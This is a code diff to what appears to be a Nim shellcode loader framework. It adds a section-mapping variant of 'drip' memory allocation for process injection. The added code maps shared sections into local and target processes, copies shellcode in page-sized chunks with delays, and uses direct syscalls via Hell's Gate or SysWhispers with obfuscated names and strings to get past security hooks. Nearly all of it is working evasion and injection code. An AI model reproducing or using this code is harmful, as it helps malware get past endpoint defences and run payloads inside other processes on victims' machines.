@@ -269,6 +269,10 @@ let CustomThreadEntryStubSecond * = """
 
 let DripAllocateStubFirst * = """
 
+when defined(remoteMapSection):
+    when defined(AllocateDripStyle):
+        var decryptbuffer: LPVOID
+
 const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000007FFFF0000),
     cast[pointer](0x00000000DDDD0000),
     cast[pointer](0x0000000010000000),
@@ -337,7 +341,17 @@ let DripAllocateStubSecond * = """
             echo obf("[*] Shellcode size: "), RegionSize
             echo obf("[*] Allocation Granularity: "), alloc_gran
             echo obf("[*] Going to allocate for "), numberOfAllocations, obf(" times")
-        var vmBaseAddress: LPVOID = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
+        
+        var vmBaseAddress: LPVOID
+
+        when defined(remoteMapSection):
+            var vmBaseAddressLocal: LPVOID = GetSuitableBaseAddress(-1, page_size, alloc_gran, numberOfAllocations)
+            vmBaseAddress = vmBaseAddressLocal
+            var checkDone: bool = false
+            when defined(remoteinject):
+                vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
+        else:
+            vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
 
         if vmBaseAddress == nil:
             when defined(verbose):
@@ -353,37 +367,122 @@ let DripAllocateStubSecond * = """
         var currentVmBase: LPVOID = cast[LPVOID](vmBaseAddress)
 
         var vcVmResv: seq[LPVOID] = @[]
+        when defined(remoteMapSection):
+                var vcVmResvRemote: seq[LPVOID] = @[]
         var sc_size: SIZE_T = cast[SIZE_T](alloc_gran)
 
         # Reserve enough memory
         var i: DWORD
         for i in 1..numberOfAllocations:
-            Sleep(1)
+            Sleep(DWORD(dripsleepinbetween))
+            
 
-            when defined(Hellsgate):
-                if getSyscall(ntAllocTable):
-                    syscall = ntAllocTable.wSysCall
+            when defined(remoteMapSection):
+                when defined(Hellsgate):
+                    if getSyscall(ntCreateSectionTable):
+                        syscall = ntCreateSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtCreateSection")
+                
+                # NtCreateSection Call
+                var sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)
+                var hMapFile: HANDLE
+                var protectionValueCreate: DWORD = PAGE_EXECUTE_READWRITE
+                when defined(Syswhispers):
+                    status = iuhqdihasduiahsdaksdhak(cast[PHANDLE](&buffer),SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,ULONG(protectionValue),SEC_COMMIT,0)
+                else:
+                    status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,protectionValueCreate,SEC_COMMIT,0)
+                when defined(verbose):
+                    echo obf("[*] NtCreateSection: "), toHex(status)
+                    #echo "This is the prompt"
+                    #var input = readLine(stdin)
+                if (hMapFile == 0):
+                    echo obf("[-] Failed to create file mapping")
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntMapViewOfSectionTable):
+                        syscall = ntMapViewOfSectionTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtMapViewOfSection")
+            
+                var
+                    vSize: SIZE_T = sc_size
+                
+                # We cannot allocate with PAGE_NOACCESS here, as this protection is afterwards not changable by NtProtectVirtualMemory.
+                # So we need to use PAGE_READWRITE instead. But we have the advantage, that we don't need to decrypt the Shellcode
+                # as that can be done later on over the current process mapped section which is still PAGE_READWRITE.
+                when defined(Syswhispers):
+                    uihzasdbnqlpoasdlykxc(hMapFile,-1,&vmBaseAddressLocal,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+                else:
+                    status = NtMapViewOfSection(hMapFile,-1,&vmBaseAddressLocal,0,0,NULL,&vSize,2,0,PAGE_READWRITE)
+
+                if not NT_SUCCESS(status):
+                    when defined(verbose):
+                        echo obf("[-] NtMapViewOfSection failed")
+                        echo obf("[*] NTSTATUS: "), toHex(status)
+
                 else:
                     when defined(verbose):
-                        echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+                        echo obf("[+] NtMapViewOfSection success!")
+                        echo obf("[*] Address: "), repr(vmBaseAddressLocal)
+                        vcVmResv.add(vmBaseAddressLocal)
+                        vmBaseAddressLocal = cast[LPVOID](cast[DWORD_PTR](vmBaseAddressLocal) + sc_size)
+                        #echo "This is the prompt"
+                        #var input = readLine(stdin)
                 
-            when defined(SysWhispers):
-                status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
-            else:
-                status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
+                when defined(localinject): # for local injection both are the same, but we need two different sections. One for RW and one for RX.
+                    if (checkDone == false):
+                        vmBaseAddress = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
+                        checkDone = true
 
-                
-            if status == STATUS_SUCCESS:
-                when defined(verbose):
-                    echo obf("[+] NtAllocateVirtualMemory succeeded")
-                vcVmResv.add(currentVmBase)
-            else:
-                when defined(verbose):
-                    echo obf("[-] NtAllocateVirtualMemory failed")
-                return nil
+                when defined(Syswhispers):
+                    uihzasdbnqlpoasdlykxc(hMapFile,ProcessHandle,&vmBaseAddress,0,0,NULL,&vSize,2,0,protectionValue)
+                else:
+                    status = NtMapViewOfSection(hMapFile,ProcessHandle,&vmBaseAddress,0,0,NULL,&vSize,2,0,protectionValue)
 
-            currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + sc_size)
+                if not NT_SUCCESS(status):
+                    when defined(verbose):
+                        echo obf("[-] NtMapViewOfSection failed")
+                        echo obf("[*] NTSTATUS: "), toHex(status)
+                else:
+                    when defined(verbose):
+                        echo obf("[+] NtMapViewOfSection success!")
+                        echo obf("[*] Address: "), repr(vmBaseAddress)
+                        vcVmResvRemote.add(vmBaseAddress)
+                        vmBaseAddress = cast[LPVOID](cast[DWORD_PTR](vmBaseAddress) + sc_size)
+                        #echo "This is the prompt"
+                        #var input = readLine(stdin)
+
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntAllocTable):
+                        syscall = ntAllocTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+                    
+                when defined(SysWhispers):
+                    status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
+                else:
+                    status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,&sc_size,MEM_RESERVE,PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#)
+
+                    
+                if status == STATUS_SUCCESS:
+                    when defined(verbose):
+                        echo obf("[+] NtAllocateVirtualMemory succeeded")
+                    vcVmResv.add(currentVmBase)
+                else:
+                    when defined(verbose):
+                        echo obf("[-] NtAllocateVirtualMemory failed")
+                    return nil
+
+                currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + sc_size)
         
+        # Set the final decryptbuffer address to the first reserved address
+        decryptbuffer = vcVmResv[0]
+
         var offsetSc: DWORD = 0
         var oldProt: DWORD
 
@@ -393,14 +492,15 @@ let DripAllocateStubSecond * = """
 
         var memoryCalc: DWORD = DWORD(DWORD(sc_size) / DWORD(sizeOfPage))
         
-        when defined(localinject):
-            ptrEncText = cast[ptr byte](unsafeAddr scArray)
-            ptrDecText = cast[ptr byte](unsafeAddr scArray)
-            decryptlate()
-        else:
-            ptrEncText = cast[ptr byte](addr encText[0])
-            ptrDecText = cast[ptr byte](addr decText[0])
-            decryptlate()
+        when not defined(remoteMapSection): # we can decrypt later with mapped sections
+            when defined(localinject): # But we cannot with NtAllocateVirtualMemory
+                ptrEncText = cast[ptr byte](unsafeAddr scArray)
+                ptrDecText = cast[ptr byte](unsafeAddr scArray)
+                decryptlate()
+            else:
+                ptrEncText = cast[ptr byte](addr encText[0])
+                ptrDecText = cast[ptr byte](addr decText[0])
+                decryptlate()
 
         for i in 0..<numberOfAllocations:
             for cmm_i in 0..<memoryCalc:
@@ -408,83 +508,90 @@ let DripAllocateStubSecond * = """
                 let offset = cmm_i * sizeOfPage
                 currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)
 
-
-                when defined(Hellsgate):
-                    if getSyscall(ntAllocTable):
-                        syscall = ntAllocTable.wSysCall
+                when not defined(remoteMapSection):
+                    when defined(Hellsgate):
+                        if getSyscall(ntAllocTable):
+                            syscall = ntAllocTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+                        
+                    when defined(SysWhispers):
+                        status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
                     else:
-                        when defined(verbose):
-                            echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
+                        status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
+
                     
-                when defined(SysWhispers):
-                    status = oqiahsjynmxkla(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
-                else:
-                    status = NtAllocateVirtualMemory(ProcessHandle,addr currentVmBase,0,addr sizeOfPage,MEM_COMMIT,PAGE_READWRITE)
-
-                
-                if(status != STATUS_SUCCESS):
-                    when defined(verbose):
-                        echo obf("[-] NtAllocateVirtualMemory failed")
-                    return nil
-                else:
-                    when defined(verbose):
-                        echo obf("\r\n[+] NtAllocateVirtualMemory succeeded")
-                        echo obf("[*] Address: "), repr(currentVmBase)
-
-                Sleep(1)
-
-                var szWritten: SIZE_T = 0
-
-
-                when defined(Hellsgate):
-                    if getSyscall(ntWriteTable):
-                        syscall = ntWriteTable.wSysCall
+                    if(status != STATUS_SUCCESS):
+                        when defined(verbose):
+                            echo obf("[-] NtAllocateVirtualMemory failed")
+                        return nil
                     else:
                         when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-                        return nil
+                            echo obf("\r\n[+] NtAllocateVirtualMemory succeeded")
+                            echo obf("[*] Address: "), repr(currentVmBase)
+
+                Sleep(DWORD(dripsleepinbetween))
                 
-                when defined(SysWhispers):
-                    status = oqiazasusjk(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
+                when defined(remoteMapSection):
+                    echo obf("[*] Moving partial shellcode to memory")
+                    moveMemory(currentVmBase, cast[pointer](unsafeAddr scArray[offsetSc]), int(sizeOfPage))
                 else:
-                    status = NtWriteVirtualMemory(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
-              
-                if(status != STATUS_SUCCESS):
-                    when defined(verbose):
-                        echo obf("[-] NtWriteVirtualMemory failed")
-                    return nil
-                else:
-                    when defined(verbose):
-                        echo obf("[+] NtWriteVirtualMemory succeeded")
-                        echo obf("[*] Address: "), repr(currentVmBase)
+                    var szWritten: SIZE_T = 0
+
+                    when defined(Hellsgate):
+                        if getSyscall(ntWriteTable):
+                            syscall = ntWriteTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                            return nil
+                    
+                    when defined(SysWhispers):
+                        status = oqiazasusjk(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
+                    else:
+                        status = NtWriteVirtualMemory(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
+                
+                    if(status != STATUS_SUCCESS):
+                        when defined(verbose):
+                            echo obf("[-] NtWriteVirtualMemory failed")
+                        return nil
+                    else:
+                        when defined(verbose):
+                            echo obf("[+] NtWriteVirtualMemory succeeded")
+                            echo obf("[*] Address: "), repr(currentVmBase)
 
                 Sleep(1)
 
                 offsetSc += DWORD(sizeOfPage)
 
-                when defined(Hellsgate):
-                    if getSyscall(ntProtectTable):              
-                        syscall = ntProtectTable.wSysCall
+                when not defined(remoteMapSection):
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):              
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                            return nil
+                    when defined(SysWhispers):
+                        status = uashdiasdj(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)
+                    else:
+                        status = NtProtectVirtualMemory(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)    
+
+                    if(status != STATUS_SUCCESS):
+                        when defined(verbose):
+                            echo obf("[-] NtProtectVirtualMemory failed")
+                        return nil
                     else:
                         when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-                        return nil
-                when defined(SysWhispers):
-                    status = uashdiasdj(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)
-                else:
-                    status = NtProtectVirtualMemory(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)    
-
-                if(status != STATUS_SUCCESS):
-                    when defined(verbose):
-                        echo obf("[-] NtProtectVirtualMemory failed")
-                    return nil
-                else:
-                    when defined(verbose):
-                        echo obf("[+] NtProtectVirtualMemory succeeded")
-                        echo obf("[*] Address: "), repr(currentVmBase)
+                            echo obf("[+] NtProtectVirtualMemory succeeded")
+                            echo obf("[*] Address: "), repr(currentVmBase)
         #write(stdout, "This is the prompt -> ")
         #var input = readLine(stdin)
-        return vmBaseAddress
+        when defined(remoteMapSection):
+            return vcVmResvRemote[0] # The RX permission page, which will be used for actual execution
+        else:
+            return vmBaseAddress
 """
 
 let UnhookNtdllStub * = """
